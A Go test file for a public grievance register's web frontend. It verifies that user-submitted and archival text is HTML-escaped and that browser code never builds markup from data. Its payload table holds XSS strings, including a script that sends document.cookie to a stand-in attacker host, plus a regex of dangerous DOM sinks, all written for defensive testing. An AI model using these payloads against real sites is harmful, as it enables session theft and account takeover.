package frontend

import (
	"io/fs"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"testing"

	"github.com/CoderSyndicate/doleances/internal/web"
)

// payloads are what a doléance may contain, because a doléance may contain
// anything: the register accepts arbitrary text from strangers and shows it to
// everybody else.
//
// marker is a plain fragment that must survive as readable text. Without it a
// template that simply dropped the field would pass — and a register that
// quietly swallowed somebody's words would be its own kind of failure.
var payloads = map[string]struct{ payload, marker string }{
	"script tag": {
		`<script>fetch('https://attacker.example/'+document.cookie)</script>`,
		"attacker.example",
	},
	"img onerror": {
		`<img src=x onerror="document.location='https://attacker.example/'">`,
		"onerror",
	},
	"svg onload": {
		`<svg/onload=alert(document.domain)>`,
		"onload",
	},
	"javascript url": {
		`<a href="javascript:alert(1)">cliquez</a>`,
		"cliquez",
	},
	"attribute break": {
		`" onmouseover="fetch('//attacker.example')" x="`,
		"onmouseover",
	},
	"style overlay": {
		`<style>body{display:none}</style><div style="position:fixed">token?</div>`,
		"display:none",
	},
	"iframe data": {
		`<iframe src="data:text/html;base64,PHNjcmlwdD4="></iframe>`,
		"base64",
	},
	"entities": {
		`&lt;script&gt;alert(1)&lt;/script&gt;`,
		"alert(1)",
	},
	"template": {
		`{{ .Secret }} {{ template "layout" . }}`,
		".Secret",
	},
}

// TestRenderedMessagesAreEscaped is the guarantee the register rests on.
//
// A message reaches a reader through several doors — published by the
// classifier, published by a curator, restored from a snapshot, or written
// straight into the database by an operator — and the escaping has to hold at
// every one of them, because it is the only thing standing between one hostile
// submission and everybody who opens the page.
//
// It deliberately does not test the classifier. Safety that depended on a
// model's judgement would be no safety at all: an installation with no model
// configured sends everything to a human, and those messages are displayed too.
func TestRenderedMessagesAreEscaped(t *testing.T) {
	for name, tc := range payloads {
		t.Run(name, func(t *testing.T) {
			card := messageCard{
				ID:             "a-doleance",
				Nickname:       tc.payload,
				Place:          tc.payload,
				Text:           tc.payload,
				Subjects:       []string{tc.payload},
				AnonymousLabel: "Anonyme",
			}

			assertNeutralised(t, renderCard(t, card), tc.payload, tc.marker)
		})
	}
}

// TestPermalinkEscapes covers the page a contributor is sent to at submission,
// which renders their own text before any curator has seen it.
func TestPermalinkEscapes(t *testing.T) {
	for name, tc := range payloads {
		t.Run(name, func(t *testing.T) {
			rendered := renderPage(t, "permalink", permalinkPage{
				page: testPage(t),
				Message: messageCard{
					ID:             "a-doleance",
					Full:           true,
					Text:           tc.payload,
					Nickname:       tc.payload,
					AnonymousLabel: "Anonyme",
				},
				Pending: true,
			})
			assertNeutralised(t, rendered, tc.payload, tc.marker)
		})
	}
}

// assertNeutralised checks the two halves of the guarantee: the submission is
// shown, and none of it can run.
//
// It asserts on the payload rather than scanning for markup anywhere in the
// page, because the page has script tags of its own — the pre-paint theme
// snippet, the map — and a test that forbade those would be testing the
// layout rather than the escaping.
func assertNeutralised(t *testing.T, rendered, payload, marker string) {
	t.Helper()

	// Nothing the contributor wrote appears as it was written. This is the
	// whole property: markup in, text out.
	if strings.Contains(rendered, payload) {
		t.Errorf("the payload was rendered verbatim — it will execute in a reader's browser:\n  %s",
			payload)
	}

	// Distinctive fragments that would mean the escaping only half worked.
	for _, fragment := range []string{
		"<script", "<svg", "<iframe", "<style", "<img",
		`onerror="`, `onload=`, `onmouseover="`, "javascript:",
	} {
		if !strings.Contains(strings.ToLower(payload), strings.ToLower(fragment)) {
			continue // not part of this payload, so not this test's business
		}
		// The page's own markup is allowed to contain these; what must not
		// appear is the fragment carrying the payload's own content with it.
		if strings.Contains(rendered, fragment+payload[len(fragment):min(len(payload), len(fragment)+12)]) {
			t.Errorf("live %q survived from the payload", fragment)
		}
	}

	// And the words themselves are still there: escaping, not swallowing.
	if !strings.Contains(rendered, marker) && !strings.Contains(rendered, escapeLike(marker)) {
		t.Errorf("the marker %q is missing — the text was dropped rather than escaped:\n%s",
			marker, excerpt(rendered))
	}
}

// escapeLike renders the characters html/template rewrites, so a marker
// containing a quote or an ampersand is still recognised.
func escapeLike(s string) string {
	return strings.NewReplacer(
		"&", "&amp;", "<", "&lt;", ">", "&gt;", `"`, "&#34;", "'", "&#39;",
	).Replace(s)
}

// TestBrowserCodeNeverBuildsMarkupFromData guards the other half.
//
// The server escapes, but half of these pages are drawn by scripts from JSON,
// and innerHTML there would reintroduce exactly the hole html/template closes.
// Every card, popup and queue item is built with createElement and textContent;
// this fails the build if that ever changes.
func TestBrowserCodeNeverBuildsMarkupFromData(t *testing.T) {
	// Assignments and calls that turn a string into markup. innerText and
	// textContent are safe and deliberately absent from this list.
	//
	// The rule has no exception, not even for `innerHTML = ""`, which is
	// harmless. A rule with a carve-out invites the next person to decide
	// their case also qualifies; textContent clears an element just as well,
	// so the strict rule costs nothing and stays easy to follow.
	dangerous := regexp.MustCompile(
		`\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML|document\.write|` +
			`\.html\s*\(|new Function|eval\s*\(`)

	// Vendored libraries are out of scope, and deliberately so. The rule is
	// about code written here: Leaflet uses innerHTML for its own controls,
	// which is its business, and the question that matters is whether *our*
	// code ever hands it a string built from somebody's doléance. It does not
	// — `map.js` builds popup nodes with createElement and textContent and
	// passes the node — and grepping a third-party bundle would only teach
	// the next person to add exceptions until the rule meant nothing.
	//
	// What keeps a vendored library honest is pinning its version, recording
	// where it came from, and the policy refusing anything that did not.
	var checked, skipped int
	err := fs.WalkDir(assets, "static", func(path string, entry fs.DirEntry, err error) error {
		if err != nil || entry.IsDir() || !strings.HasSuffix(path, ".js") {
			return err
		}
		if strings.Contains(path, "/third-party/") {
			skipped++
			return nil
		}
		checked++

		source, err := fs.ReadFile(assets, path)
		if err != nil {
			return err
		}
		for _, match := range dangerous.FindAllString(string(source), -1) {
			t.Errorf("%s builds markup from data with %q — use createElement and "+
				"textContent, or a doléance becomes executable", path, strings.TrimSpace(match))
		}
		return nil
	})
	if err != nil {
		t.Fatalf("walk static assets: %v", err)
	}
	// A guard that silently checked nothing would be worse than no guard.
	if checked == 0 {
		t.Fatal("no scripts were checked; the walk found nothing")
	}
	// And one whose exemption had quietly grown to cover everything would be
	// the same thing wearing a better disguise.
	if skipped > checked {
		t.Errorf("%d scripts were skipped as third-party and only %d checked", skipped, checked)
	}
}

func excerpt(rendered string) string {
	const limit = 600
	if len(rendered) <= limit {
		return rendered
	}
	return rendered[:limit] + "…"
}

// ---------------------------------------------------------------------------
// Test helpers: render a real template with real data.
//
// These go through the same renderer the service uses, rather than a
// hand-built template, so the test is about what visitors actually receive.
// ---------------------------------------------------------------------------

func testRenderer(t *testing.T) *web.Renderer {
	t.Helper()

	renderer, err := web.NewRenderer(assets, "templates/shared/*.html", "templates/pages/*.html")
	if err != nil {
		t.Fatalf("NewRenderer: %v", err)
	}
	return renderer
}

func testPage(t *testing.T) page {
	t.Helper()

	localization, err := web.NewLocalization(assets, "locales", fallbackLanguage)
	if err != nil {
		t.Fatalf("NewLocalization: %v", err)
	}

	request := httptest.NewRequest(http.MethodGet, "/", nil)
	var resolved *http.Request
	localization.Middleware(http.HandlerFunc(func(_ http.ResponseWriter, r *http.Request) {
		resolved = r
	})).ServeHTTP(httptest.NewRecorder(), request)

	return page{Page: web.NewPage(resolved, localization, "register.title")}
}

// signedInPage is a page rendered for somebody carrying a session.
//
// It decides what a page *offers*, never what anybody may do, which is why a
// test can simply set it: the authority is the cookie the backend checks, and
// the flag is only how the template knows which controls make sense.
func signedInPage(t *testing.T) page {
	t.Helper()

	p := testPage(t)
	p.SignedIn = true
	return p
}

func renderPage(t *testing.T, name string, data any) string {
	t.Helper()

	recorder := httptest.NewRecorder()
	testRenderer(t).Render(recorder, http.StatusOK, name, data)

	if recorder.Code != http.StatusOK {
		t.Fatalf("rendering %s returned %d", name, recorder.Code)
	}
	return recorder.Body.String()
}

// renderCard renders one message card through the register page, which is how
// a reader meets somebody else's words.
func renderCard(t *testing.T, card messageCard) string {
	t.Helper()

	return renderPage(t, "register", registerPage{
		page:    testPage(t),
		Entries: []registerEntry{{Message: &card}},
	})
}

// TestTheRegisterScriptBuildsTheSameCard.
//
// The register draws its list in the browser so the map can filter it, which
// means a card exists twice: in the message-card template and in register.js.
// They drifted once already — the register showed cards with no excerpt link
// and no controls while every other page had them, and nothing failed.
//
// This does not prove they render alike, which no test here can. It proves the
// script still mentions every piece, so deleting one from the template without
// touching the script is noticed.
func TestTheRegisterScriptBuildsTheSameCard(t *testing.T) {
	source, err := assets.ReadFile("static/register.js")
	if err != nil {
		t.Fatalf("read register.js: %v", err)
	}
	script := string(source)

	for _, piece := range []string{
		"card-excerpt", // the words are the link
		"card-more",    // and say when they were cut
		"card-actions", // the footer
		"card-action",  // the controls in it
		"data-like",    // which like.js reads
		"like-count",
		"/like", // posting to the same place the template does

		// The keep control. It only exists for a signed-in reader, and it has
		// to exist *here* as well: the map filters this list, so these cards
		// replace the server's, and a control living only in the template
		// would silently disappear the moment somebody panned the map.
		"card-action keep",
		"/keep",
		"/release",
		"signedIn",

		// The report control and the mark that replaces it. Both halves have
		// to exist here: the map filters this list, so these cards replace the
		// server's, and a doléance whose control vanished on a pan would be one
		// nobody could ask a person to look at.
		"card-action report",
		"card-action verified",
		"/report",
	} {
		if !strings.Contains(script, piece) {
			t.Errorf("register.js no longer builds %q — the two cards have drifted", piece)
		}
	}

	template, err := assets.ReadFile("templates/shared/layout.html")
	if err != nil {
		t.Fatalf("read layout.html: %v", err)
	}
	for _, piece := range []string{
		"card-excerpt", "card-more", "card-actions", "data-like",
		"card-action keep", "/keep", "/release",
		"card-action report", "card-action verified", "/report",
	} {
		if !strings.Contains(string(template), piece) {
			t.Errorf("the template no longer builds %q", piece)
		}
	}
}

// TestTheRegisterScriptBuildsTheSamePassageCard.
//
// The passage card now exists twice as well, for the reason the doléance card
// does: the register mixes 1789 into its list, the map filters that list, and
// these cards replace the server's the moment somebody pans. A piece that
// lived only in the template would vanish on a pan — and nothing would fail,
// because nothing can.
//
// This is the second copy of this hazard in one file. It is the cost of the
// register being a live list rather than a page, and the cost is paid here
// rather than discovered by a reader finding half a card.
func TestTheRegisterScriptBuildsTheSamePassageCard(t *testing.T) {
	source, err := assets.ReadFile("static/register.js")
	if err != nil {
		t.Fatalf("read register.js: %v", err)
	}
	script := string(source)

	for _, piece := range []string{
		"card historical",   // the card itself
		"card-document",     // what this is, before what it says
		"card-title",        // the passage's own label
		"card-provenance",   // where it came from
		"card-place",        //   the region
		"card-source",       //   and the citation, which is all that stands
		"placeholder-badge", //   in for somebody who cannot correct it
		"translated-badge",  // whose words these actually are
		"/voices/",          // a passage has an address of its own
		"likeHintPast",      // "this is still true", which is not "me too"
		"card-action keep",  // and the same two controls as any other card
	} {
		if !strings.Contains(script, piece) {
			t.Errorf("register.js no longer builds %q — the passage card has drifted "+
				"from the template", piece)
		}
	}

	template, err := assets.ReadFile("templates/shared/layout.html")
	if err != nil {
		t.Fatalf("read layout.html: %v", err)
	}
	for _, piece := range []string{
		"card historical", "card-document", "card-title", "card-provenance",
		"card-place", "card-source", "placeholder-badge", "translated-badge",
		"/voices/",
	} {
		if !strings.Contains(string(template), piece) {
			t.Errorf("the template no longer builds %q", piece)
		}
	}
}

// TestHistoricalCardsCarryTheSameControls. A passage from 1789 is a card like
// any other: a link to where it lives, and a way to say it is still true.
func TestHistoricalCardsCarryTheSameControls(t *testing.T) {
	rendered := renderPage(t, "voice", voicePage{
		page: testPage(t),
		Text: historicalCard{
			ID: "sjdl-deesses", Title: "Des déesses d'un autre genre",
			Text:  "Nous étions à leurs yeux autant de déesses.",
			Likes: 4, Full: true,
		},
	})

	if !strings.Contains(rendered, `action="/voices/sjdl-deesses/like"`) {
		t.Error("a passage cannot be recognised")
	}
	if !strings.Contains(rendered, `href="/voices/sjdl-deesses"`) {
		t.Error("a passage has no permalink")
	}
	// On its own page the words are not a link to the page they are on.
	if strings.Contains(rendered, "card-excerpt") {
		t.Error("the passage's own page links its text to itself")
	}
}

// TestHistoricalTextIsEscaped. The corpus is transcribed by hand from archival
// documents, and a transcription is text like any other.
func TestHistoricalTextIsEscaped(t *testing.T) {
	for name, tc := range payloads {
		t.Run(name, func(t *testing.T) {
			rendered := renderPage(t, "voice", voicePage{
				page: testPage(t),
				Text: historicalCard{
					ID: "a-passage", Title: tc.payload, Text: tc.payload,
					DocumentTitle: tc.payload, Source: tc.payload,
					Region: tc.payload, Full: true,
				},
			})
			assertNeutralised(t, rendered, tc.payload, tc.marker)
		})
	}
}
